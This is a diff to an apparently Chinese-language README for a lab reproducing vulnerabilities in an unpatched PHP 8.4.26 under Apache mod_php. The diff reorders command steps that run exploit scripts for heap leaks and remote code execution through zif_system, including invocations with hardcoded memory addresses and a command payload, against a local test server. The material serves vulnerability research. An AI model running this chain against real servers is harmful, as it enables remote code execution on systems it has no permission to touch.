@@ -11,25 +11,20 @@ mod_php + PHP 8.4.26（官方源码自编译、未打补丁）的一组漏洞复
 `127.0.0.1:8088`。no-ASLR 地址与各阶段偏移绑定本实验构建，换环境需重新校准。
 
 ```bash
-# 1) no-ASLR 纯 HTTP RCE（需 display_errors=On，两个请求）
-python3 tools/send_a_ps.py 17 19 3 12
-python3 tools/send_b_rce2.py 7 2 0x7ffff5e6e0d8 0x7ffff7d13490 "id>/tmp/p1"
+# 0) display_errors=0 一键链（只校验 display_errors=0，绝不修改配置；输出 chunk base）
+#    sshpass -p '<LAB_PASSWORD>' ssh -t <LAB_USER>@<LAB_HOST> 'bash ~/demo_de0_leak.sh'
 
-# 2) ASLR-on 全链（堆泄漏 → libphp 泄漏 → zif_system，含纯 HTTP 轮换）
-CMD="id>/tmp/p1" bash tools/pure_aslr_run.sh
-
-# 0) 一键录像 demo：ASLR 证明 + 全链 + 泄漏值/maps 交叉验证
-#    （在目标机执行；脚本已部署为 ~/demo_aslr_video.sh）
-# sshpass -p '<LAB_PASSWORD>' ssh -t <LAB_USER>@<LAB_HOST> 'bash ~/demo_aslr_video.sh'
-
-# 3) display_errors=0 堆泄漏（需 gdb；A-only 与 A+B forge）
+# 1) display_errors=0 手动分步（需 gdb；A-only 与 A+B forge）
 ./tools/trial_bins.sh 0 62 235 15000 208 0 4000 103
 BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
   ./tools/trial_ab.sh 0 62 235 15000 208 0 4000 103
 
-# 4) display_errors=0 一键链（只校验 display_errors=0，绝不修改配置；输出 chunk base）
-#    sshpass -p '<LAB_PASSWORD>' ssh -t <LAB_USER>@<LAB_HOST> 'bash ~/demo_de0_leak.sh'
+# 2) no-ASLR 纯 HTTP RCE（需 display_errors=On，两个请求）
+python3 tools/send_a_ps.py 17 19 3 12
+python3 tools/send_b_rce2.py 7 2 0x7ffff5e6e0d8 0x7ffff7d13490 "id>/tmp/p1"
 
+# 3) ASLR-on 全链（需 display_errors=On；demo_aslr_video.sh 会临时设置并恢复）
+CMD="id>/tmp/p1" bash tools/pure_aslr_run.sh
 ```
 
 > 步骤 3 的 `trial_*.sh` 会重启本机 Apache 并挂 gdb，仅用于校准/取证；
